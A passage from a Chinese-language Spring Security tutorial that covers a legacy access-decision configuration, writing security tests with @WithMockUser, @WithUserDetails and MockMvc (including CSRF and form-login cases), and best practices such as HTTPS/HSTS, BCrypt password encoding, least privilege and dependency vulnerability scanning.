FilterInvocation.class.isAssignableFrom(clazz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>配置 (使用 <code>WebSecurityConfigurerAdapter</code> 的老式方法)</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    http.authorizeRequests()</span><br><span class="line">        .withObjectPostProcessor(<span class="keyword">new</span> <span class="title class_">ObjectPostProcessor</span>&lt;FilterSecurityInterceptor&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> &lt;O <span class="keyword">extends</span> <span class="title class_">FilterSecurityInterceptor</span>&gt; O <span class="title function_">postProcess</span><span class="params">(O fsi)</span> &#123;</span><br><span class="line">                fsi.setAccessDecisionManager(<span class="keyword">new</span> <span class="title class_">DynamicAccessDecisionManager</span>());</span><br><span class="line">                <span class="comment">// fsi.setSecurityMetadataSource(...) 如果需要的话</span></span><br><span class="line">                <span class="keyword">return</span> fsi;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .anyRequest().authenticated();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个配置方式比较晦涩，这也是 Spring Security 推荐迁移到 <code>AuthorizationManager</code> 的原因之一。</p>
<hr>
<h2 id="7-测试与最佳实践"><a href="#7-测试与最佳实践" class="headerlink" title="7. 测试与最佳实践"></a>7. 测试与最佳实践</h2><h3 id="7-1-Spring-Security-测试"><a href="#7-1-Spring-Security-测试" class="headerlink" title="7.1 Spring Security 测试"></a>7.1 Spring Security 测试</h3><p>在开发过程中，手动登录并测试每个受保护的端点既繁琐又容易出错。Spring Security 提供了强大的测试支持，允许我们编写自动化的集成测试，来验证我们的安全配置是否按预期工作。</p>
<h4 id="7-1-1-核心测试依赖"><a href="#7-1-1-核心测试依赖" class="headerlink" title="7.1.1 核心测试依赖"></a>7.1.1 核心测试依赖</h4><p>要进行 Spring Security 的测试，你需要确保项目中包含了以下依赖：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Spring Boot 的测试启动器，包含了 JUnit, Mockito, Spring Test 等 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Spring Security 的测试支持 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.security<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-security-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="7-1-2-模拟已认证用户"><a href="#7-1-2-模拟已认证用户" class="headerlink" title="7.1.2 模拟已认证用户"></a>7.1.2 模拟已认证用户</h4><p><code>spring-security-test</code> 模块最核心的功能就是提供了一系列注解，让我们可以在测试方法运行时，轻松地**“伪造”**一个已认证的用户身份，而无需经过实际的登录流程。</p>
<h5 id="1-WithMockUser-最简单、最常用的模拟"><a href="#1-WithMockUser-最简单、最常用的模拟" class="headerlink" title="1. @WithMockUser: 最简单、最常用的模拟"></a>1. <code>@WithMockUser</code>: 最简单、最常用的模拟</h5><p>这个注解会在执行测试方法前，自动在 <code>SecurityContextHolder</code> 中放入一个模拟的 <code>Authentication</code> 对象。</p>
<p><strong>常用属性</strong>:</p>
<ul>
<li><code>username</code> &#x2F; <code>value</code>: 模拟的用户名（默认为 “user”）。</li>
<li><code>password</code>: 模拟的密码（默认为 “password”）。</li>
<li><code>roles</code>: 一个字符串数组，用于指定用户拥有的<strong>角色</strong>。<strong>注意</strong>: 你提供的角色名<strong>不需要</strong> <code>ROLE_</code> 前缀，注解会自动添加。</li>
<li><code>authorities</code>: 一个字符串数组，用于指定用户拥有的<strong>权限</strong>。这里的字符串会原样作为 <code>GrantedAuthority</code>。</li>
</ul>
<p><strong>示例</strong>:</p>
<p>假设我们有一个 <code>AdminController</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/admin&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdminController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/dashboard&quot;)</span></span><br><span class="line">    <span class="meta">@PreAuthorize(&quot;hasRole(&#x27;ADMIN&#x27;)&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAdminDashboard</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome, Admin!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/user-profile&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUserProfile</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Authentication</span> <span class="variable">authentication</span> <span class="operator">=</span> SecurityContextHolder.getContext().getAuthentication();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, &quot;</span> + authentication.getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在来编写测试类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.test.context.support.WithMockUser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.web.servlet.MockMvc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="meta">@AutoConfigureMockMvc</span> <span class="comment">// 自动配置 MockMvc</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdminControllerTests</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> MockMvc mockMvc;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="meta">@WithMockUser(username = &quot;test_admin&quot;, roles = &#123;&quot;ADMIN&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">whenAdminAccessesDashboard_thenSucceeds</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        mockMvc.perform(get(<span class="string">&quot;/admin/dashboard&quot;</span>))</span><br><span class="line">               .andExpect(status().isOk())</span><br><span class="line">               .andExpect(content().string(<span class="string">&quot;Welcome, Admin!&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="meta">@WithMockUser(username = &quot;test_user&quot;, roles = &#123;&quot;USER&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">whenUserAccessesDashboard_thenIsForbidden</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// test_user 只有 USER 角色，没有 ADMIN 角色</span></span><br><span class="line">        mockMvc.perform(get(<span class="string">&quot;/admin/dashboard&quot;</span>))</span><br><span class="line">               .andExpect(status().isForbidden()); <span class="comment">// 期望得到 403 Forbidden</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="meta">@WithMockUser(username = &quot;john.doe&quot;)</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">whenAnyAuthenticatedUserAccessesProfile_thenSucceeds</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        mockMvc.perform(get(<span class="string">&quot;/admin/user-profile&quot;</span>))</span><br><span class="line">               .andExpect(status().isOk())</span><br><span class="line">               .andExpect(content().string(<span class="string">&quot;Hello, john.doe&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>@SpringBootTest</code>: 加载完整的 Spring 应用上下文。</li>
<li><code>@AutoConfigureMockMvc</code>: 自动注入 <code>MockMvc</code> Bean，这是我们模拟 HTTP 请求的入口。</li>
<li><code>@WithMockUser</code> 应用在测试方法上，为该次测试提供了一个临时的安全上下文。方法执行完毕后，上下文会自动清理。</li>
</ul>
<hr>
<h5 id="2-WithUserDetails-使用真实的-UserDetailsService"><a href="#2-WithUserDetails-使用真实的-UserDetailsService" class="headerlink" title="2. @WithUserDetails: 使用真实的 UserDetailsService"></a>2. <code>@WithUserDetails</code>: 使用真实的 <code>UserDetailsService</code></h5><p><code>@WithMockUser</code> 非常方便，但它创建的是一个<strong>完全模拟</strong>的用户，这个用户可能并不存在于你的数据库中。如果你希望测试的 <code>Authentication</code> 对象是由你自己的 <code>UserDetailsService</code> 加载而来的真实用户数据，你应该使用 <code>@WithUserDetails</code>。</p>
<p><strong>前提</strong>: 你必须已经实现了一个 <code>UserDetailsService</code> Bean。</p>
<p><strong>常用属性</strong>:</p>
<ul>
<li><code>value</code> &#x2F; <code>username</code>: 指定要加载的用户名。</li>
<li><code>userDetailsServiceBeanName</code>: (可选) 如果你有多个 <code>UserDetailsService</code> 的实现，可以用这个属性指定要使用哪一个 Bean。</li>
</ul>
<p><strong>示例</strong>:<br>假设你的 <code>JpaUserDetailsService</code> 会从数据库加载用户。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="meta">@WithUserDetails(&quot;real_admin_from_db&quot;)</span> <span class="comment">// 假设数据库中存在名为 &quot;real_admin_from_db&quot; 的用户</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">whenAuthenticatingWithRealUser_thenSucceeds</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 在这个测试方法中，SecurityContextHolder 中的 Principal</span></span><br><span class="line">    <span class="comment">// 将是一个由你的 JpaUserDetailsService.loadUserByUsername() 方法返回的真实 UserDetails 对象</span></span><br><span class="line">    </span><br><span class="line">    mockMvc.perform(get(<span class="string">&quot;/admin/dashboard&quot;</span>))</span><br><span class="line">           .andExpect(status().isOk());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>优点</strong>: 这种方式的测试保真度更高，因为它使用了你的真实用户数据加载逻辑，可以一并测试 <code>UserDetailsService</code> 的正确性。</p>
<hr>
<h4 id="7-1-3-结合-MockMvc-测试-Controller-层的安全端点"><a href="#7-1-3-结合-MockMvc-测试-Controller-层的安全端点" class="headerlink" title="7.1.3 结合 MockMvc 测试 Controller 层的安全端点"></a>7.1.3 结合 <code>MockMvc</code> 测试 Controller 层的安全端点</h4><p><code>MockMvc</code> 是 Spring Test 框架提供的服务器端测试工具，它允许我们在不启动完整 Web 服务器的情况下，对 Controller 进行“真实”的 HTTP 请求调用。</p>
<h5 id="1-测试未认证的访问"><a href="#1-测试未认证的访问" class="headerlink" title="1. 测试未认证的访问"></a>1. 测试未认证的访问</h5><p>要测试匿名用户访问受保护的端点，非常简单：<strong>不使用任何 <code>@With...</code> 注解即可</strong>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">whenAnonymousAccessesProtectedEndpoint_thenIsRedirectedToLogin</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 假设我们配置了 Form Login</span></span><br><span class="line">    mockMvc.perform(get(<span class="string">&quot;/admin/dashboard&quot;</span>))</span><br><span class="line">           .andExpect(status().is3xxRedirection()) <span class="comment">// 期望 3xx 重定向</span></span><br><span class="line">           .andExpect(redirectedUrl(<span class="string">&quot;http://localhost/login&quot;</span>)); <span class="comment">// 期望重定向到登录页</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">whenAnonymousAccessesApiEndpoint_thenIsUnauthorized</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 假设 /api/data 是受保护的，且异常处理器会返回 401</span></span><br><span class="line">    mockMvc.perform(get(<span class="string">&quot;/api/data&quot;</span>))</span><br><span class="line">           .andExpect(status().isUnauthorized()); <span class="comment">// 期望 401 Unauthorized</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="2-测试-CSRF-防护"><a href="#2-测试-CSRF-防护" class="headerlink" title="2. 测试 CSRF 防护"></a>2. 测试 CSRF 防护</h5><p>当你的应用开启了 CSRF 防护时，所有“不安全”的请求（POST, PUT, DELETE）都必须携带有效的 CSRF Token。<code>spring-security-test</code> 提供了 <code>csrf()</code> 请求后处理器来自动处理这个问题。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.csrf;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="meta">@WithMockUser</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">whenPostingWithCsrfToken_thenSucceeds</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    mockMvc.perform(post(<span class="string">&quot;/transfer&quot;</span>)</span><br><span class="line">                .param(<span class="string">&quot;amount&quot;</span>, <span class="string">&quot;100&quot;</span>)</span><br><span class="line">                .with(csrf())) <span class="comment">// ✨ 添加一个有效的 CSRF Token</span></span><br><span class="line">           .andExpect(status().isOk());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="meta">@WithMockUser</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">whenPostingWithoutCsrfToken_thenIsForbidden</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    mockMvc.perform(post(<span class="string">&quot;/transfer&quot;</span>)</span><br><span class="line">                .param(<span class="string">&quot;amount&quot;</span>, <span class="string">&quot;100&quot;</span>))</span><br><span class="line">                <span class="comment">// 没有 .with(csrf())</span></span><br><span class="line">           .andExpect(status().isForbidden()); <span class="comment">// 期望 403 Forbidden</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>with(csrf())</code> 会自动模拟一个合法的 CSRF Token 并将其放入请求中，让你的测试能够顺利通过 CSRF 过滤器的检查。</p>
<hr>
<h5 id="3-测试表单登录"><a href="#3-测试表单登录" class="headerlink" title="3. 测试表单登录"></a>3. 测试表单登录</h5><p><code>spring-security-test</code> 还提供了一个便捷的 <code>formLogin()</code> 请求处理器来模拟完整的表单登录流程。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestBuilders.formLogin;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.security.test.web.servlet.response.SecurityMockMvcResultMatchers.authenticated;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.security.test.web.servlet.response.SecurityMockMvcResultMatchers.unauthenticated;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">whenLoginWithValidCredentials_thenIsAuthenticated</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    mockMvc.perform(formLogin(<span class="string">&quot;/login&quot;</span>).user(<span class="string">&quot;user&quot;</span>).password(<span class="string">&quot;password&quot;</span>)) <span class="comment">// 模拟表单登录</span></span><br><span class="line">           .andExpect(status().is3xxRedirection())</span><br><span class="line">           .andExpect(redirectedUrl(<span class="string">&quot;/&quot;</span>))</span><br><span class="line">           .andExpect(authenticated().withUsername(<span class="string">&quot;user&quot;</span>)); <span class="comment">// 验证认证成功</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">whenLoginWithInvalidCredentials_thenIsUnauthenticated</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    mockMvc.perform(formLogin(<span class="string">&quot;/login&quot;</span>).user(<span class="string">&quot;user&quot;</span>).password(<span class="string">&quot;wrongpassword&quot;</span>))</span><br><span class="line">           .andExpect(status().is3xxRedirection())</span><br><span class="line">           .andExpect(redirectedUrl(<span class="string">&quot;/login?error&quot;</span>))</span><br><span class="line">           .andExpect(unauthenticated()); <span class="comment">// 验证认证失败</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>formLogin()</code> 极大地简化了登录接口的测试，同时 <code>authenticated()</code> 和 <code>unauthenticated()</code> 断言也让结果验证更清晰。</p>
<hr>
<h3 id="7-2-安全最佳实践"><a href="#7-2-安全最佳实践" class="headerlink" title="7.2 安全最佳实践"></a>7.2 安全最佳实践</h3><p>仅仅正确配置 Spring Security 是不够的，一个安全的应用是一个系统工程，需要遵循一系列业界公认的最佳实践。</p>
<h4 id="7-2-1-始终使用-HTTPS"><a href="#7-2-1-始终使用-HTTPS" class="headerlink" title="7.2.1 始终使用 HTTPS"></a>7.2.1 始终使用 HTTPS</h4><p><strong>为什么？</strong></p>
<p>未使用 HTTPS 的 HTTP 协议是<strong>明文传输</strong>的。这意味着在客户端和服务器之间传输的所有数据，包括用户名、密码、Session Cookie、JWT Token 以及任何敏感的业务数据，都可能被网络中间人（如同一 WiFi 下的攻击者、ISP、网络节点）轻易地窃听和截获。这就是所谓的<strong>中间人攻击 (Man-in-the-Middle, MITM)</strong>。</p>
<p><strong>如何做？</strong></p>
<ul>
<li><p><strong>生产环境强制 HTTPS</strong>: 必须为你的生产环境配置 SSL&#x2F;TLS 证书。现在有许多免费的证书颁发机构（如 Let’s Encrypt），获取证书非常方便。</p>
</li>
<li><p><strong>配置 Spring Boot 开启 SSL</strong>: 在 <code>application.properties</code> 或 <code>yml</code> 中配置服务器 SSL 属性。</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.ssl.key-store</span>=<span class="string">classpath:keystore.p12</span></span><br><span class="line"><span class="attr">server.ssl.key-store-password</span>=<span class="string">your-password</span></span><br><span class="line"><span class="attr">server.ssl.key-alias</span>=<span class="string">your-alias</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>HTTP 到 HTTPS 的自动重定向</strong>: 配置你的 Web 服务器（如 Nginx）或应用网关，将所有传入的 HTTP 请求（端口 80）自动重定向到 HTTPS（端口 443）。在 Spring Security 中，你也可以配置来实现这一点：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.requiresChannel(channel -&gt; channel.anyRequest().requiresSecure());</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>使用 HSTS (HTTP Strict Transport Security)</strong>: 在响应头中添加 <code>Strict-Transport-Security</code>。这会告诉浏览器，在未来的一段时间内，所有对该域名的访问都<strong>必须</strong>使用 HTTPS，从而防止 SSL 剥离攻击。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http.headers(headers -&gt; headers</span><br><span class="line">    .httpStrictTransportSecurity(hsts -&gt; hsts</span><br><span class="line">        .includeSubDomains(<span class="literal">true</span>)</span><br><span class="line">        .maxAgeInSeconds(<span class="number">31536000</span>)</span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="7-2-2-使用强大的密码编码策略"><a href="#7-2-2-使用强大的密码编码策略" class="headerlink" title="7.2.2 使用强大的密码编码策略"></a>7.2.2 使用强大的密码编码策略</h4><p><strong>为什么？</strong></p>
<p>正如 <code>2.3</code> 节所述，明文存储密码是灾难性的。即使是使用过时的哈希算法（如 MD5, SHA-1）也无法有效抵御现代的破解技术。一个强大的密码策略能够确保即使数据库被泄露，用户的原始密码也不会暴露。</p>
<p><strong>如何做？</strong></p>
<ul>
<li><p><strong>选择合适的算法</strong>:</p>
<ul>
<li><strong>首选 <code>BCryptPasswordEncoder</code></strong>: 它是目前功能、安全性和易用性之间最好的平衡点，是绝大多数新项目的默认选择。</li>
<li>如果对安全有更高要求，可以考虑 <code>SCryptPasswordEncoder</code> 或 <code>Argon2PasswordEncoder</code>。</li>
</ul>
</li>
<li><p><strong>使用 <code>DelegatingPasswordEncoder</code></strong>: 这是 Spring Security 的默认行为，也是最佳实践。它允许你平滑地升级密码存储算法，而无需强制所有用户重置密码。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Spring Boot 会自动配置这个，你只需要提供一个具体的 Encoder Bean 即可</span></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> PasswordEncoder <span class="title function_">passwordEncoder</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BCryptPasswordEncoder</span>(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>调整工作因子</strong>: 对于 <code>BCryptPasswordEncoder</code>，可以根据你的服务器性能调整其构造函数中的 <code>strength</code> 参数（默认为 10）。这个值越高，哈希计算越慢，暴力破解的难度就越大。你应该选择一个既能提供足够安全性，又不会导致登录响应时间过长的值。</p>
</li>
</ul>
<hr>
<h4 id="7-2-3-最小权限原则-Principle-of-Least-Privilege"><a href="#7-2-3-最小权限原则-Principle-of-Least-Privilege" class="headerlink" title="7.2.3 最小权限原则 (Principle of Least Privilege)"></a>7.2.3 最小权限原则 (Principle of Least Privilege)</h4><p><strong>为什么？</strong></p>
<p>这个原则要求任何用户、程序或进程只应拥有其完成任务所必需的最小权限集合。如果一个账户（无论是用户还是系统服务）被盗用，最小权限原则可以极大地限制攻击者能够造成的损害范围。</p>
<p><strong>如何做？</strong></p>
<ul>
<li><strong>避免使用“超级管理员”</strong>: 不要创建一个可以为所欲为的 <code>SUPER_ADMIN</code> 角色，然后把它分配给所有需要管理权限的用户。</li>
<li><strong>基于角色的访问控制 (RBAC)</strong>: 将权限（细粒度的操作许可，如 <code>user:create</code>, <code>order:approve</code>）分配给角色（职责集合，如 <code>USER_MANAGER</code>, <code>ORDER_APPROVER</code>），再将角色分配给用户。</li>
<li><strong>默认拒绝</strong>: 你的授权策略应该是“默认拒绝，明确允许”。对于任何未明确配置权限的资源，都应该默认拒绝访问。在 Spring Security 中，这通常通过在授权规则链的末尾加上 <code>.anyRequest().authenticated()</code> 或 <code>.anyRequest().denyAll()</code> 来实现。</li>
<li><strong>为 API 客户端授权</strong>: 当使用客户端凭证模式为后台服务授权时，也应遵循最小权限原则。例如，一个“报表生成服务”只应被授予读取相关数据的权限，而绝不应该有写入或删除的权限。</li>
</ul>
<hr>
<h4 id="7-2-4-依赖项安全扫描"><a href="#7-2-4-依赖项安全扫描" class="headerlink" title="7.2.4 依赖项安全扫描"></a>7.2.4 依赖项安全扫描</h4><p><strong>为什么？</strong></p>
<p>你的应用不仅仅是你自己写的代码。它构建在大量的开源第三方库（依赖项）之上。这些依赖项可能存在已知的安全漏洞（CVEs - Common Vulnerabilities and Exposures）。攻击者常常利用这些公开的漏洞来攻击系统。</p>
<p><strong>如何做？</strong></p>
<ul>
<li><strong>使用自动化扫描工具</strong>:<ul>
<li><strong>Maven</strong>: 使用 <code>dependency-check-maven</code> 插件。</li>
<li><strong>Gradle</strong>: 使用 <code>dependency-check-gradle</code> 插件。</li>
<li><strong>GitHub</strong>: 启用 <strong>Dependabot</strong>，它可以自动扫描你的依赖项，并在发现漏洞时创建 Pull Request 来更新到安全版本。</li>
<li><strong>商业工具</strong>: Snyk, Sonatype Nexus Lifecycle 等提供了更强大的扫描和管理功能。</li>
</ul>
</li>
